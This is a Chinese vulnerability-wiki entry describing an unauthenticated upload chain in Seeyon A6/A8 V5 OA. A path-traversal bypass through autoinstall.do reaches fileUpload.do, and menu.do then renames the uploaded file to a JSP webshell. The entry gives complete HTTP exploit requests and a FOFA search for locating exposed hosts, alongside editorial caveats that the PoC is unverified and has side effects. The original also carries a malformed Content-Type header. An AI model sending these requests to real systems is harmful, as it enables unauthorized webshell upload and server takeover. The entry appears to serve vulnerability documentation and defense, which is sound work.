---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "致远A6/A8 V5 fileUpload.do认证路径绕过→menu.do重命名写脚本链"
product: "致远A6/A8 V5"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "V5.x声称，FOFA示例V5.6SP1；目录结构和menu权限"
prerequisites: "声称未认证，通过autoinstall/../../"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9C%E4%BA%92%E8%81%94-OA%20%E5%89%8D%E5%8F%B0fileUpload.do%20%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "title=\"协同管理软件 V5.6SP1\""
fofa_unverified: "title="
id: "vw-1d3798314165d47bd7385d91"
entity_id: "ve-1d3798314165d47bd7385d91"
schema_version: "1"
---

# 致远A6/A8 V5 fileUpload.do认证路径绕过→menu.do重命名写脚本链

## 条目说明

- 对象与具体问题：致远A6/A8 V5；fileUpload.do认证路径绕过→menu.do重命名写脚本链
- 版本、配置及部署条件：V5.x声称，FOFA示例V5.6SP1；目录结构和menu权限
- 认证与权限前提：声称未认证，通过autoinstall/../../
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 两个接口加动态fileid链完整，不与formulaManager同ajax标题链混并
- Content-Type重复写Content-Type: Content-Type:，HTTP无围栏；FOFA残缺title=
- 缺最终menu图标保存路径文本，只有截图；在野利用无来源
- 改菜单图标可能影响业务，应标写入/改配置副作用

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

致远互联-OA 接口 fileUpload.do 接口处存在文件上传漏洞，未经身份验证的远程攻击者可通过目录遍历的方式绕过上传接口限制，并利用menu.do接口替换上传文件的fileid值实现webshell上传到服务器，获取服务器权限，控制整个 web 服务器。

## 影响范围

致远A8 V5.x 版本

致远A6 V5.x 版本

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：title="协同管理软件 V5.6SP1"

POC/EXP：（上传图片获取fileid值）

```http
POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
Host: 127.0.0.1
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)

--00content0boundary00
Content-Disposition: form-data; name="type"


--00content0boundary00
Content-Disposition: form-data; name="extensions"

png
--00content0boundary00
Content-Disposition: form-data; name="applicationCategory"


--00content0boundary00
Content-Disposition: form-data; name="destDirectory"


--00content0boundary00
Content-Disposition: form-data; name="destFilename"


--00content0boundary00
Content-Disposition: form-data; name="maxSize"


--00content0boundary00
Content-Disposition: form-data; name="isEncrypt"

false
--00content0boundary00
Content-Disposition: form-data; name="file1"; filename="1.png"
Content-Type: Content-Type: application/pdf

<% out.println("hello");%>
--00content0boundary00--
```


![image-20240409133457289](./.resource/致远互联-OA前台fileUpload.do绕过文件上传漏洞/media/image-20240409133457289.png)


POC/EXP：（填写fileid值把文件转换成jsp文件 ）

```http
POST /seeyon/autoinstall.do/../../seeyon/privilege/menu.do HTTP/1.1
Host: 127.0.0.1:8000
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)

method=uploadMenuIcon&fileid=-1091575552474397688&filename=ce.jsp
```


![image-20240409133524178](./.resource/致远互联-OA前台fileUpload.do绕过文件上传漏洞/media/image-20240409133524178.png)


![image-20240409133607955](./.resource/致远互联-OA前台fileUpload.do绕过文件上传漏洞/media/image-20240409133607955.png)


## 修复方案

**官方修复：**

 关闭互联网暴露面或设置接口访问权限

 升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
